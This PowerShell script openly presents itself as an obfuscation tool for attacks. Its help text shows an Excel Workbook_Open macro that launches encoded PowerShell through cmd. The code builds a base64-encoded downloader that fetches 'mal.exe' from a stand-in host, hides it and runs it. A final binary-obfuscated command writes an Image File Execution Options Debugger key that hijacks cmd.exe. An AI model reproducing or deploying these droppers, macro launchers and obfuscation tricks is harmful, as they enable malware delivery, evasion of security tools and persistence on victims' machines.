﻿<#
.SYNOPSIS
    .
.DESCRIPTION
    This script makes your string obfuscation
    You can using it to macro in excel but it can be blocked powershell, so you can run using cmd like below.
    
    Private Sub Workbook_Open()
    # powershell.exe -noP -sta -w 1
    pscmd1 = "cmd /k powershell.exe -enc endcodeData" # if encoded by base64
    pscmd1 = "cmd /k powershell.exe -command { endcodeData }" # if encoded by binary
    Call Shell(pscmd, vbNormalFocus)
    End Sub

.PARAMETER Command
    Convert String to obfuscation

.EXAMPLE
    MakeEn.ps1 string

.NOTES
    Author: Hyeok Jang
    Date:   May 16, 2020
#>
<# encode by binary 

# binary is pOWErSHeLl
powershell -Command { "1110000|1001111|1010111|1000101|1110010|1010011|1001000|1100101|1001100|1101100".Split("|") | % { $CM+=[char][convert]::Toint32($_,2) }; powershell write-host $CM }

# binary is write-host asd
powershell -Command { "1110000|1101111|1110111|1100101|1110010|1110011|1101000|1100101|1101100|1101100|100000|1110111|1110010|1101001|1110100|1100101|101101|1101000|1101111|1110011|1110100|100000|1100001|1110011|1100100".Split("|") | % { $CM+=[char][convert]::Toint32($_,2) }; [sCRiPtbLOCk]::cREaTe($CM) | % { &$_ } }
#>
$Encoded = $Decoded = $null
"$command".toCHaRaRRay() | % { $Encoded += [convert]::ToString($([text.Encoding]::ASCII.GetBytes($_)),2) + "|" }
Write-Host $Encoded

$Encoded.split("|") | % { if($_ -ne "" ) { $Decoded += [char][convert]::Toint32($_,2)} }
Write-Host $Decoded

<# encode by base64
cmd /k powershell 
#>
$server = "http://malware.com/mal.exe"
$output = "$env:USERPROFILE\Documents\mal.exe"

$sTR = "Start-BitsTransfer -Source $server -Destination $output"
$option = "; powershell.exe attrib +H +S $output; powershell $output"
$payload = $sTR + $option

$Encoded = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($payload))
$Decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Encoded))
Write-Host $Encoded
Write-Host $Decoded

&([char]112+[char]79+[char]119+[char]69+[char]82+[char]83+[char]104+[char]69+[char]108+[char]76) -cOMMANd { "1001000|1001011|1001100|1001101|111010|1011100|1010011|1001111|1000110|1010100|1010111|1000001|1010010|1000101|1011100|1001101|1101001|1100011|1110010|1101111|1110011|1101111|1100110|1110100|1011100|1010111|1101001|1101110|1100100|1101111|1110111|1110011|100000|1001110|1010100|1011100|1000011|1110101|1110010|1110010|1100101|1101110|1110100|1010110|1100101|1110010|1110011|1101001|1101111|1101110|1011100|1001001|1101101|1100001|1100111|1100101|100000|1000110|1101001|1101100|1100101|100000|1000101|1111000|1100101|1100011|1110101|1110100|1101001|1101111|1101110|100000|1001111|1110000|1110100|1101001|1101111|1101110|1110011|1011100|1100011|1101101|1100100|101110|1100101|1111000|1100101|111001|111001|1000100|1100101|1100010|1110101|1100111|1100111|1100101|1110010|111001|111001|1100011|1100001|1101100|1100011|101110|1100101|1111000|1100101".Split("|") | % { $___+=[char][convert]::Toint32($_,2) }; [sCRiPtbLOCk]::cREaTe($___) | % { `N`I "$_".split("99")[0] ; `s`p "$_".split("99")[0] -nAMe "$_".split("99")[2] -vALuE "$_".split("99")[4] } }
